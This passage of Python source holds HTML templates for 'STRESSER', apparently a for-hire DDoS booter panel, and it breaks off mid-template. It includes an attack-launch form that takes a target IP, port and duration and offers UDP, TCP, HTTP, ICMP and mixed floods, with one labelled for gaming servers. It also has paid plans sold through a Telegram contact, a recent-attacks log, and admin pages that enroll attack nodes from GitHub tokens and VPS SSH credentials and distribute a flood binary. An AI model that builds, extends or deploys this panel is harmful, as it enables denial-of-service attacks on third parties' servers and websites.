    <div class="glass-card">
        <div class="d-flex justify-content-between align-items-center">
            <h3><i class="fas fa-chart-line me-2"></i> Network Status</h3>
            <span class="badge bg-info">{{ slots_used }} / {{ max_slots }} Slots Used</span>
        </div>
        <div class="mt-3">
            <div class="d-flex justify-content-between"><span>Network Load</span><span>{{ (slots_used/max_slots*100)|round(0) if max_slots>0 else 0 }}%</span></div>
            <div class="progress mt-2" style="height:8px;"><div class="progress-bar bg-info" style="width: {{ (slots_used/max_slots*100) if max_slots>0 else 0 }}%; transition:width 1s ease;"></div></div>
        </div>
        <div class="row mt-4">
            <div class="col-6 text-center"><div class="stat-number">{{ slots_used }}</div><div>Slots Used</div></div>
            <div class="col-6 text-center"><div class="stat-number">{{ max_slots }}</div><div>Max Slots</div></div>
        </div>
        <div class="mt-4"><a href="/products" class="btn-neon">⚡ Upgrade Now</a></div>
    </div>
    <div class="glass-card">
        <h3><i class="fas fa-key me-2"></i> Redeem Access Key</h3>
        <p>Have a premium key? Redeem it here to upgrade your plan instantly.</p>
        <form method="POST" action="/redeem">
            <div class="input-group">
                <input type="text" name="key" class="form-control bg-dark text-white" placeholder="Enter your key (e.g., KEY-XXXXXXXX)" required>
                <button type="submit" class="btn-neon" style="width:auto; padding:12px 30px; border-radius:60px;">Redeem</button>
            </div>
        </form>
        <small class="text-muted">Key will be applied to your current account.</small>
    </div>
    <div class="glass-card">
        <h3><i class="fas fa-history me-2"></i> Recent Attacks</h3>
        <div class="table-responsive">
            <table class="table table-dark table-hover">
                <thead><tr><th>Target</th><th>Port</th><th>Duration</th><th>Method</th><th>Threads</th><th>Status</th><th>Time</th></tr></thead>
                <tbody>
                {% for a in attacks %}
                <tr><td>{{ a.target }}</td><td>{{ a.port }}</td><td>{{ a.duration }}s</td><td>{{ a.method }}</td><td>{{ a.threads }}</td><td><span class="badge bg-success">{{ a.status }}</span></td><td>{{ a.timestamp.strftime('%H:%M:%S') }}</td></tr>
                {% else %}
                <tr><td colspan="7" class="text-center">No attacks yet</td></tr>
                {% endfor %}
                </tbody>
            </table>
        </div>
    </div>
</div>
<script>document.getElementById('menuToggle').addEventListener('click',()=>{document.getElementById('sidebar').classList.toggle('open');});</script>
</body></html>
'''

ATTACK_HTML = '''
<!DOCTYPE html>
<html><head><title>Attack Hub • STRESSER</title><meta name="viewport" content="width=device-width, initial-scale=1">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>body{background:radial-gradient(circle at 10% 20%, #0a0a1a, #000); font-family:'Inter',sans-serif; color:#fff; padding:20px; animation:fadeInUp 0.6s ease-out;}
.glass-card{background:rgba(15,25,45,0.45);backdrop-filter:blur(12px);border-radius:32px;border:1px solid rgba(0,255,200,0.2);padding:28px;margin-bottom:30px;}
.btn-neon{background:linear-gradient(90deg,#00b377,#00cc88);border:none;border-radius:60px;padding:12px 24px;font-weight:bold;transition:0.2s;width:100%;}
.btn-neon:hover{transform:scale(1.02);box-shadow:0 0 15px #00ff88;}
input,select{background:rgba(0,0,0,0.5); border:1px solid #2a3a5a; border-radius:40px; padding:12px 20px; color:white; width:100%;}
@keyframes fadeInUp{from{opacity:0;transform:translateY(20px);}to{opacity:1;transform:translateY(0);}}
</style>
</head>
<body><div class="container py-4">
<div class="glass-card"><h2 class="mb-3"><i class="fas fa-bolt me-2"></i> Launch Attack</h2>
{% with messages = get_flashed_messages(with_categories=true) %}{% for cat, msg in messages %}<div class="alert alert-{{cat}}">{{msg}}</div>{% endfor %}{% endwith %}
<form method="POST">
    <div class="mb-3"><label>Target IP Address</label><input type="text" name="target" placeholder="e.g., 1.1.1.1" required></div>
    <div class="mb-3"><label>Port</label><input type="number" name="port" placeholder="443" required></div>
    <div class="mb-3"><label>Duration (seconds) – Max {{ user.max_duration }}s</label><input type="number" name="duration" value="60" min="1" max="{{ user.max_duration }}" required></div>
    <div class="mb-3"><label>Attack Method</label>
        <select name="method" class="form-select bg-dark text-white">
            <option value="udp">🔥 UDP Flood (Gaming/BGMI)</option>
            <option value="tcp">🌐 TCP Flood (Web Servers)</option>
            <option value="http">💻 HTTP Flood (Websites)</option>
            <option value="icmp">📡 ICMP Flood (Network Layer)</option>
            <option value="mixed">⚡ Mixed Flood (All Purpose)</option>
        </select>
    </div>
    <div class="mb-3"><label>Threads (Power) – Max {{ user.max_threads }}</label>
        <input type="range" name="threads" class="form-range" min="100" max="{{ user.max_threads }}" value="1500" oninput="this.nextElementSibling.value=this.value"><output>1500</output>
    </div>
    <div class="mb-3"><label>Concurrent (Max {{ user.max_concurrent }})</label>
        <input type="range" name="concurrent" class="form-range" min="1" max="{{ user.max_concurrent }}" value="1" oninput="this.nextElementSibling.value=this.value"><output>1</output>
    </div>
    <button type="submit" class="btn-neon">💥 Launch Attack</button>
</form></div>
<a href="/dashboard" class="btn btn-link text-info">← Back to Dashboard</a></div>
<script>document.querySelectorAll('input[type="range"]').forEach(r=>r.addEventListener('input',function(){this.nextElementSibling.value=this.value;}));</script>
</body></html>
'''

PRODUCTS_HTML = '''
<!DOCTYPE html>
<html><head><title>Products • STRESSER</title><meta name="viewport" content="width=device-width, initial-scale=1">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>body{background:radial-gradient(circle at 10% 20%, #0a0a1a, #000); font-family:'Inter',sans-serif; color:#fff; padding:20px; animation:fadeInUp 0.6s ease-out;}
.glass-card{background:rgba(15,25,45,0.45);backdrop-filter:blur(12px);border-radius:32px;border:1px solid rgba(0,255,200,0.2);padding:28px;margin-bottom:30px;transition:0.3s;}
.glass-card:hover{border-color:rgba(0,255,200,0.6);transform:translateY(-3px);}
.btn-neon{background:linear-gradient(90deg,#00b377,#00cc88);border:none;border-radius:60px;padding:12px 24px;font-weight:bold;color:#000;}
.pricing-card{text-align:center;}.price{font-size:36px;font-weight:800;color:#00ffcc;}
@keyframes fadeInUp{from{opacity:0;transform:translateY(20px);}to{opacity:1;transform:translateY(0);}}
</style>
</head>
<body><div class="container py-4">
<div class="d-flex justify-content-between align-items-center mb-4"><h2 style="color:#00ffcc;">🚀 Upgrade Your Plan</h2><a href="/dashboard" class="btn btn-link text-info">← Back</a></div>
<div class="row g-4">
{% for plan in plans %}
<div class="col-md-3"><div class="glass-card pricing-card"><h3>{{ plan.name }}</h3><div class="price">{{ plan.price }}</div>
<div class="mt-3"><p><i class="fas fa-layer-group"></i> {{ plan.concurrent }} Concurrent</p><p><i class="fas fa-hourglass-half"></i> {{ plan.duration }}s Max</p><p><i class="fas fa-microchip"></i> {{ plan.threads }} Threads</p></div>
<a href="https://t.me/Ig_ansh" target="_blank" class="btn-neon mt-3" style="display:inline-block; text-decoration:none;">💬 Contact on Telegram</a></div></div>
{% endfor %}
</div>
<div class="glass-card mt-4 text-center"><h4>Need a custom plan?</h4><p>Reach out directly on Telegram:</p>
<a href="https://t.me/Ig_ansh" target="_blank" class="btn-neon" style="display:inline-block; text-decoration:none;"><i class="fab fa-telegram-plane me-2"></i>@Ig_ansh</a></div>
</div></body></html>
'''

REDEEM_HTML = '''
<!DOCTYPE html>
<html><head><title>Redeem Key</title><meta name="viewport" content="width=device-width, initial-scale=1">
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
<style>body{background:radial-gradient(circle at 10% 20%, #0a0a1a, #000);color:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;}
.glass-card{background:rgba(15,25,45,0.6);backdrop-filter:blur(12px);border-radius:32px;border:1px solid rgba(0,255,200,0.2);padding:40px;width:100%;max-width:450px;box-shadow:0 20px 40px rgba(0,0,0,0.4);}
input{background:rgba(0,0,0,0.5);border:1px solid #2a3a5a;border-radius:40px;padding:12px 20px;color:white;width:100%;margin-bottom:20px;}
.btn-neon{background:linear-gradient(90deg,#00b377,#00cc88);border:none;border-radius:40px;padding:12px;font-weight:bold;width:100%;}
a{color:#00ffcc;text-decoration:none;}</style>
</head><body><div class="glass-card"><h2 class="text-center mb-4" style="color:#00ffcc;">🔑 Redeem Access Key</h2>
{% with messages = get_flashed_messages(with_categories=true) %}{% for cat,msg in messages %}<div class="alert alert-{{cat}}">{{msg}}</div>{% endfor %}{% endwith %}
<form method="POST"><input type="text" name="key" placeholder="Enter your key" required><button type="submit" class="btn-neon">Redeem</button></form>
<p class="text-center mt-3"><a href="/login">Back to login</a> | <a href="/register">Register</a></p></div></body></html>
'''

ADMIN_LOGIN_HTML = '''
<!DOCTYPE html>
<html><head><title>Admin Login • STRESSER</title><meta name="viewport" content="width=device-width, initial-scale=1">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
<style>body{background:radial-gradient(circle at 10% 20%, #0a0a1a, #000); font-family:'Inter',sans-serif; color:#fff; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; padding:20px; animation:fadeInUp 0.6s ease-out;}
.glass-card{background:rgba(15,25,45,0.6); backdrop-filter:blur(12px); border-radius:32px; border:1px solid rgba(255,0,100,0.3); padding:40px; width:100%; max-width:450px; box-shadow:0 20px 40px rgba(0,0,0,0.4);}
input{background:rgba(0,0,0,0.5); border:1px solid #2a3a5a; border-radius:40px; padding:12px 20px; color:white; width:100%; margin-bottom:20px;}
.btn-admin{background:linear-gradient(90deg,#ff3366,#ff6680); border:none; border-radius:40px; padding:12px; font-weight:bold; width:100%;}
@keyframes fadeInUp{from{opacity:0;transform:translateY(20px);}to{opacity:1;transform:translateY(0);}}
</style>
</head>
<body><div class="glass-card"><h2 class="text-center mb-4" style="color:#ff6680;">👑 Admin Login</h2>
{% with messages = get_flashed_messages(with_categories=true) %}{% for cat, msg in messages %}<div class="alert alert-{{ cat }}">{{ msg }}</div>{% endfor %}{% endwith %}
<form method="POST"><input type="text" name="username" placeholder="Admin Username" required><input type="password" name="password" placeholder="Admin Password" required><button type="submit" class="btn-admin">🔐 Login as Admin</button></form>
<p class="text-center mt-3"><a href="/login">← User Login</a></p></div></body></html>
'''

ADMIN_DASHBOARD_ENHANCED_HTML = '''
<!DOCTYPE html>
<html><head><title>Admin Dashboard • STRESSER</title><meta name="viewport" content="width=device-width, initial-scale=1">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>:root{--neon:#00ffcc;--danger:#ff3366;--warning:#ffaa00;--success:#00cc88;}
body{background:radial-gradient(circle at 10% 20%, #0a0a1a, #000);font-family:'Inter',sans-serif;color:#fff;padding:20px;}
.glass-card{background:rgba(15,25,45,0.5);backdrop-filter:blur(12px);border-radius:24px;border:1px solid rgba(0,255,200,0.15);padding:20px;margin-bottom:20px;transition:0.3s;}
.glass-card:hover{transform:translateY(-3px);border-color:rgba(0,255,200,0.4);box-shadow:0 10px 30px rgba(0,0,0,0.3);}
.stat-card{text-align:center;padding:20px 10px;}
.stat-number{font-size:36px;font-weight:800;background:linear-gradient(135deg,#fff,var(--neon));-webkit-background-clip:text;background-clip:text;color:transparent;}
.status-badge{padding:4px 10px;border-radius:40px;font-size:12px;font-weight:600;}
.status-active{background:rgba(0,204,136,0.2);color:#00cc88;border:1px solid #00cc88;}
.status-nobinary{background:rgba(255,170,0,0.2);color:#ffaa00;border:1px solid #ffaa00;}
.status-dead{background:rgba(255,51,102,0.2);color:#ff3366;border:1px solid #ff3366;}
.node-row{display:flex;align-items:center;padding:12px;border-bottom:1px solid rgba(255,255,255,0.05);animation:fadeIn 0.5s;}
.node-row:hover{background:rgba(0,255,200,0.05);}
@keyframes pulse{0%{opacity:1}50%{opacity:0.6}100%{opacity:1}}.loading-pulse{animation:pulse 1.5s infinite;}
@keyframes fadeIn{from{opacity:0;transform:translateY(10px);}to{opacity:1;transform:translateY(0);}}
</style></head>
<body><div class="container-fluid">
<div class="d-flex justify-content-between align-items-center mb-4"><h2><i class="fas fa-shield-alt me-2" style="color:var(--neon);"></i>Admin Dashboard</h2>
<div>
    <a href="/admin/nodes" class="btn btn-outline-info me-2"><i class="fas fa-server"></i> Nodes</a>
    <a href="/admin/keys" class="btn btn-outline-warning me-2"><i class="fas fa-key"></i> Keys</a>
    <a href="/admin/api_keys" class="btn btn-outline-info me-2"><i class="fas fa-key"></i> API Keys</a>
    <a href="/admin/settings" class="btn btn-outline-secondary me-2"><i class="fas fa-cog"></i> Settings</a>
    <a href="/admin/test-attack" class="btn btn-outline-warning me-2"><i class="fas fa-flask"></i> Test Attack</a>
    {% if can_manage_admins %}
    <a href="/admin/manage" class="btn btn-outline-light me-2"><i class="fas fa-user-shield"></i> Manage Admins</a>
    {% endif %}
    <a href="/admin/logout" class="btn btn-outline-danger"><i class="fas fa-sign-out-alt"></i> Logout</a>
</div></div>
<div class="glass-card"><h5><i class="fas fa-bolt me-2"></i>Attack Status <span id="attackStatusBadge" class="badge bg-secondary">Loading...</span></h5><div id="attackDetails" class="mt-2"></div></div>
<div class="row g-4 mb-4">
<div class="col-md-3"><div class="glass-card stat-card"><div class="stat-number">{{ total_users }}</div><div>Total Users</div></div></div>
<div class="col-md-3"><div class="glass-card stat-card"><div class="stat-number">{{ total_attacks }}</div><div>Total Attacks</div></div></div>
<div class="col-md-3"><div class="glass-card stat-card"><div class="stat-number">{{ total_nodes }}</div><div>Total Nodes</div></div></div>
<div class="col-md-3"><div class="glass-card stat-card"><div class="stat-number">{{ active_nodes }}</div><div>Active Nodes</div></div></div>
</div>
<div class="glass-card"><div class="d-flex justify-content-between align-items-center mb-3"><h5><i class="fas fa-server me-2"></i>Live Node Status</h5><button class="btn btn-sm btn-outline-info" onclick="refreshNodeStatus()"><i class="fas fa-sync-alt"></i> Refresh</button></div><div id="nodeList"><div class="text-center text-muted loading-pulse">Loading node status...</div></div></div>
<div class="row mt-4"><div class="col-md-6"><div class="glass-card"><h6>Quick Actions</h6><button class="btn btn-outline-success w-100" onclick="testAllNodes()"><i class="fas fa-vial"></i> Test All Nodes</button></div></div>
<div class="col-md-6"><div class="glass-card"><h6>Attack Control</h6><button class="btn btn-outline-warning w-100" onclick="stopAttack()"><i class="fas fa-stop"></i> Stop All Attacks</button></div></div></div>
</div>
<script>
let refreshInterval;
document.addEventListener('DOMContentLoaded',function(){refreshNodeStatus();refreshAttackStatus();refreshInterval=setInterval(refreshNodeStatus,10000);setInterval(refreshAttackStatus,3000);});
async function refreshNodeStatus(){try{const res=await fetch('/admin/nodes/status/all');const nodes=await res.json();renderNodeList(nodes);updateStats(nodes);}catch(e){console.error(e);}}
function renderNodeList(nodes){const container=document.getElementById('nodeList');if(nodes.length===0){container.innerHTML='<div class="text-center text-muted">No nodes added</div>';return;}let html='';nodes.forEach(node=>{const statusClass=node.status==='active'?'status-active':(node.status==='no_binary'?'status-nobinary':'status-dead');const binaryIcon=node.binary?'✅':'❌';const enabledIcon=node.enabled?'🟢':'⚫';html+=`<div class="node-row"><div class="me-3">${enabledIcon}</div><div style="flex:2"><strong>${node.name}</strong> <span class="text-muted">(${node.type})</span></div><div style="flex:1"><span class="status-badge ${statusClass}">${node.status}</span></div><div style="flex:1">Binary: ${binaryIcon}</div><div style="flex:1">Attacks: ${node.attack_count||0}</div><div><button class="btn btn-sm btn-outline-info" onclick="testNode('${node.id}')"><i class="fas fa-sync-alt"></i></button></div></div>`;});container.innerHTML=html;}
function updateStats(nodes){const active=nodes.filter(n=>n.status==='active').length;document.getElementById('activeNodes').innerText=active;}
async function testNode(nodeId){const btn=event.target.closest('button');const orig=btn.innerHTML;btn.innerHTML='<span class="spinner-border spinner-border-sm"></span>';btn.disabled=true;try{const res=await fetch(`/admin/nodes/${nodeId}/test`,{method:'POST'});const data=await res.json();alert(`Test Result: ${data.status} - ${data.message}`);refreshNodeStatus();}catch(e){alert('Test failed');}finally{btn.innerHTML=orig;btn.disabled=false;}}
async function testAllNodes(){if(!confirm('Test all nodes?'))return;const nodes=await fetch('/admin/nodes/status/all').then(r=>r.json());for(const node of nodes){await fetch(`/admin/nodes/${node.id}/test`,{method:'POST'});}refreshNodeStatus();alert('All nodes tested');}
async function refreshAttackStatus(){try{const res=await fetch('/admin/attack/status');const data=await res.json();const badge=document.getElementById('attackStatusBadge');const details=document.getElementById('attackDetails');if(data.is_attacking){badge.className='badge bg-danger';badge.innerText='ATTACK RUNNING';if(data.current_attack){details.innerHTML=`🎯 ${data.current_attack.target}:${data.current_attack.port} | ⏱️ ${data.current_attack.duration}s | Queue: ${data.queue_length}`;}}else{badge.className='badge bg-success';badge.innerText='IDLE';details.innerHTML=`Queue: ${data.queue_length} pending`;}}catch(e){}}
async function stopAttack(){if(!confirm('Stop all attacks?'))return;try{await fetch('/admin/attack/stop',{method:'POST'});alert('Stop command sent');refreshAttackStatus();}catch(e){alert('Failed');}}
</script>
</body></html>
'''

ADMIN_NODES_HTML = '''
<!DOCTYPE html>
<html><head><title>Admin Nodes • STRESSER</title><meta name="viewport" content="width=device-width, initial-scale=1">
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>body{background:#0a0a1a;color:#fff;padding:20px;}.glass-card{background:rgba(15,25,45,0.45);border-radius:24px;padding:20px;margin-bottom:20px;}
.status-online{color:#00ff88;}.status-offline{color:#ff6680;}table{width:100%;border-collapse:collapse;}th,td{padding:12px;border-bottom:1px solid #2a3a5a;}</style>
</head>
<body><div class="container"><div class="glass-card"><h2>Attack Node Management</h2><a href="/admin/dashboard" class="btn btn-secondary mb-3">← Back</a>
<div class="row g-4">
<div class="col-md-6"><div class="card bg-dark"><div class="card-header">➕ Add GitHub Node</div><div class="card-body">
<form method="POST" action="/admin/nodes/add_github"><input type="text" name="name" placeholder="Node Name" class="form-control mb-2" required>
<input type="text" name="github_token" placeholder="GitHub Token" class="form-control mb-2" required>
<input type="text" name="github_repo" placeholder="Repo Name (default: InfernoCore)" class="form-control mb-2">
<div class="form-check mb-2"><input type="checkbox" name="enabled" class="form-check-input" checked> <label class="form-check-label">Enabled</label></div>
<button type="submit" class="btn btn-primary">Add GitHub Node</button></form></div></div></div>
<div class="col-md-6"><div class="card bg-dark"><div class="card-header">➕ Add VPS Node</div><div class="card-body">
<form method="POST" action="/admin/nodes/add_vps" enctype="multipart/form-data"><input type="text" name="name" placeholder="Node Name" class="form-control mb-2" required>
<input type="text" name="vps_host" placeholder="VPS Host (IP)" class="form-control mb-2" required>
<input type="number" name="vps_port" placeholder="Port (default 22)" class="form-control mb-2" value="22">
<input type="text" name="vps_username" placeholder="Username" class="form-control mb-2" required>
<input type="password" name="vps_password" placeholder="Password (or leave empty for key)" class="form-control mb-2">
<div class="mb-2"><label>SSH Private Key (.pem file) – optional</label><input type="file" name="vps_key_file" class="form-control" accept=".pem,.key"></div>
<div class="form-check mb-2"><input type="checkbox" name="enabled" class="form-check-input" checked> <label class="form-check-label">Enabled</label></div>
<button type="submit" class="btn btn-primary">Add VPS Node</button></form></div></div></div>
</div>
<div class="card bg-dark mt-4"><div class="card-header">📤 Distribute Binary (primex)</div><div class="card-body">
<form method="POST" action="/admin/upload_binary" enctype="multipart/form-data" class="row g-2">
<div class="col-md-8"><input type="file" name="binary" class="form-control bg-dark text-white" required></div>
<div class="col-md-4"><button type="submit" class="btn btn-warning">Upload & Distribute</button></div></form><small class="text-muted">Upload compiled 'primex' binary.</small></div></div>
<div class="table-responsive mt-4"><table class="table table-dark"><thead><tr><th>Name</th><th>Type</th><th>Enabled</th><th>Status</th><th>Binary</th><th>Details</th><th>Actions</th></tr></thead>
<tbody>{% for n in nodes %}<tr><td>{{ n.name }}</td><td>{{ n.node_type }}</td><td>{% if n.enabled %}<span class="text-success">✔</span>{% else %}<span class="text-danger">✘</span>{% endif %}</td>
<td class="{% if n.status_detail=='active' %}status-online{% else %}status-offline{% endif %}">{{ n.status_detail|default('unknown') }}</td>
<td>{% if n.binary_present %}<span class="text-success">✓</span>{% else %}<span class="text-danger">✗</span>{% endif %}</td>
<td>{% if n.node_type=='github' %}{{ n.github_repo }}{% else %}{{ n.vps_host }}:{{ n.vps_port }}{% endif %}</td>
<td><form method="POST" action="/admin/nodes/{{ n.id }}/check" style="display:inline"><button class="btn btn-sm btn-info">Check</button></form>
<form method="POST" action="/admin/nodes/{{ n.id }}/toggle" style="display:inline"><button class="btn btn-sm btn-warning">Toggle</button></form>
<form method="POST" action="/admin/nodes/{{ n.id }}/delete" style="display:inline" onsubmit="return confirm('Delete node?')"><button class="btn btn-sm btn-danger">Delete</button></form></td></tr>{% endfor %}</tbody></table></div></div></div></body></html>
'''

ADMIN_KEYS_HTML = '''
<!DOCTYPE html>
<html><head><title>Key Management</title><meta name="viewport" content="width=device-width, initial-scale=1">
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>body{background:#0a0a1a;color:#fff;padding:20px;}.glass-card{background:rgba(15,25,45,0.5);border-radius:24px;padding:20px;}</style>
</head><body><div class="container"><div class="glass-card"><h3><i class="fas fa-key me-2"></i>Key Management</h3>
<a href="/admin/dashboard" class="btn btn-secondary mb-3">← Back</a>
<form method="POST" action="/admin/keys/generate" class="row g-3 mb-4">
  <div class="col-md-3">
    <select name="plan" class="form-select bg-dark text-white">
      {% for p in plans %}<option value="{{ p.name }}">{{ p.name }}</option>{% endfor %}
    </select>
  </div>
  <div class="col-md-2"><input type="number" name="days" class="form-control" placeholder="Days" value="30"></div>
  <div class="col-md-2"><input type="number" name="count" class="form-control" placeholder="Count" value="1"></div>
  <div class="col-md-5"><button class="btn btn-success w-100"><i class="fas fa-plus"></i> Generate Keys</button></div>
</form>
<table class="table table-dark"><thead><tr><th>Key</th><th>Plan</th><th>Days</th><th>Created</th><th>Used By</th><th>Status</th><th>Action</th></tr></thead>
<tbody>{% for k in keys %}<tr><td><code>{{ k.key }}</code></td><td>{{ k.plan }}</td><td>{{ k.duration_days }}</td><td>{{ k.created_at.strftime('%Y-%m-%d') }}</td>
<td>{{ k.used_by or '-' }}</td><td>{% if k.active and not k.used_by %}<span class="badge bg-success">Active</span>{% elif k.used_by %}<span class="badge bg-info">Used</span>{% else %}<span class="badge bg-secondary">Inactive</span>{% endif %}</td>
<td><form method="POST" action="/admin/keys/{{ k.id }}/delete" onsubmit="return confirm('Delete?')"><button class="btn btn-sm btn-danger">Delete</button></form></td></tr>{% endfor %}</tbody></table></div></div></body></html>
'''

ADMIN_SETTINGS_HTML = '''
<!DOCTYPE html>
<html><head><title>Admin Settings • STRESSER</title><meta name="viewport" content="width=device-width, initial-scale=1">
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>body{background:#0a0a1a;color:#fff;padding:20px;}.glass-card{background:rgba(15,25,45,0.45);border-radius:24px;padding:20px;margin-bottom:20px;}
.btn-neon{background:linear-gradient(90deg,#00b377,#00cc88);border:none;border-radius:40px;padding:8px 20px;font-weight:bold;color:#000;}
.btn-danger{background:#ff3355;border:none;color:#fff;}.btn-warning{background:#ffaa00;color:#000;}</style>
</head>
<body><div class="container">
<div class="glass-card"><h2><i class="fas fa-cog me-2"></i>Admin Settings</h2><a href="/admin/dashboard" class="btn btn-secondary mb-3">← Back</a>
<ul class="nav nav-tabs mb-3" id="settingsTabs" role="tablist">
  <li class="nav-item"><a class="nav-link active" data-bs-toggle="tab" href="#config">⚙️ Configuration</a></li>
  <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" href="#storage">💾 Storage</a></li>
  <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" href="#security">🔐 Security</a></li>
  <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" href="#broadcast">📢 Broadcast</a></li>
</ul>
<div class="tab-content">
  <div class="tab-pane fade show active" id="config">
    <form method="POST" action="/admin/settings/update">
      <input type="hidden" name="action" value="update_config">
      <div class="row">
        <div class="col-md-6"><label>Global Cooldown (seconds)</label><input type="number" name="cooldown" class="form-control bg-dark text-white" value="{{ cooldown }}" min="0"><small>Time users must wait between attacks.</small></div>
        <div class="col-md-6"><label>Max Attack Duration (seconds)</label><input type="number" name="max_duration" class="form-control bg-dark text-white" value="{{ max_duration }}" min="1"><small>Absolute maximum attack time.</small></div>
      </div>
      <div class="row mt-3">
        <div class="col-md-6"><label>Default Threads (new users)</label><input type="number" name="default_threads" class="form-control bg-dark text-white" value="{{ default_threads }}" min="100"></div>
        <div class="col-md-6"><label>Max Threads Limit</label><input type="number" name="max_threads" class="form-control bg-dark text-white" value="{{ max_threads }}" min="100"><small>Hard limit for all users.</small></div>
      </div>
      <button type="submit" class="btn-neon mt-3">Save Configuration</button>
    </form>
    <hr class="my-4"><h5>Maintenance Mode</h5><p>Status: <span class="badge bg-{{ 'danger' if maintenance else 'success' }}">{{ 'ON' if maintenance else 'OFF' }}</span></p>
    <form method="POST" action="/admin/settings/update"><input type="hidden" name="action" value="toggle_maintenance"><button type="submit" class="btn btn-warning">Toggle Maintenance Mode</button></form>
  </div>
  <div class="tab-pane fade" id="storage">
    <h5>Database Statistics</h5>
    <table class="table table-dark"><tr><th>Collection</th><th>Documents</th><th>Actions</th></tr>
      <tr><td>Users</td><td>{{ stats.users }}</td><td><form method="POST" action="/admin/settings/clear/users" onsubmit="return confirm('Clear all non-admin users?')"><button class="btn btn-sm btn-danger">Clear</button></form></td></tr>
      <tr><td>API Keys</td><td>{{ stats.api_keys }}</td><td><form method="POST" action="/admin/settings/clear/api_keys" onsubmit="return confirm('Clear all API keys?')"><button class="btn btn-sm btn-danger">Clear</button></form></td></tr>
      <tr><td>Attack Logs</td><td>{{ stats.attack_logs }}</td><td><form method="POST" action="/admin/settings/clear/attack_logs" onsubmit="return confirm('Clear all attack logs?')"><button class="btn btn-sm btn-warning">Clear</button></form></td></tr>
      <tr><td>Attack Nodes</td><td>{{ stats.attack_nodes }}</td><td><form method="POST" action="/admin/settings/clear/attack_nodes" onsubmit="return confirm('Clear all nodes?')"><button class="btn btn-sm btn-danger">Clear</button></form></td></tr>
      <tr><td>Generated Keys</td><td>{{ stats.generated_keys }}</td><td><form method="POST" action="/admin/settings/clear/generated_keys" onsubmit="return confirm('Clear all keys?')"><button class="btn btn-sm btn75">Clear</button></form></td></tr>
    </table>
    <p>Total Database Size: {{ (stats.db_size / 1024 / 1024)|round(2) }} MB</p>
  </div>
  <div class="tab-pane fade" id="security">
    <h5>Change Admin Password</h5>
    <form method="POST" action="/admin/settings/update"><input type="hidden" name="action" value="change_password">
      <div class="mb-3"><input type="password" name="new_password" class="form-control bg-dark text-white" placeholder="New password" required></div>
      <div class="mb-3"><input type="password" name="confirm_password" class="form-control bg-dark text-white" placeholder="Confirm password" required></div>
      <button type="submit" class="btn btn-primary">Update Password</button>
    </form>
  </div>
  <div class="tab-pane fade" id="broadcast">
    <h5>Send Message to All Users</h5>
    <form method="POST" action="/admin/settings/update"><input type="hidden" name="action" value="broadcast">
      <textarea name="message" class="form-control bg-dark text-white mb-3" rows="4" placeholder="Your message..." required></textarea>
      <button type="submit" class="btn btn-info">Send Broadcast</button>
    </form>
  </div>
</div>
</div></div>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body></html>
'''

ADMIN_TEST_ATTACK_HTML = '''
<!DOCTYPE html>
<html><head><title>Test Attack • Admin</title><meta name="viewport" content="width=device-width, initial-scale=1">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>:root{--neon:#00ffcc;--danger:#ff3366;--warning:#ffaa00;--success:#00cc88;}
body{background:radial-gradient(circle at 10% 20%, #0a0a1a, #000);font-family:'Inter',sans-serif;color:#fff;padding:20px;}
.glass-card{background:rgba(15,25,45,0.5);backdrop-filter:blur(12px);border-radius:24px;border:1px solid rgba(0,255,200,0.15);padding:20px;margin-bottom:20px;transition:0.3s;}
.glass-card:hover{transform:translateY(-3px);border-color:rgba(0,255,200,0.4);box-shadow:0 10px 30px rgba(0,0,0,0.3);}
.btn-neon{background:linear-gradient(90deg,#00b377,#00cc88);border:none;border-radius:60px;padding:12px 24px;font-weight:bold;color:#000;}
.btn-neon:hover{transform:scale(1.02);box-shadow:0 0 15px #00ff88;}
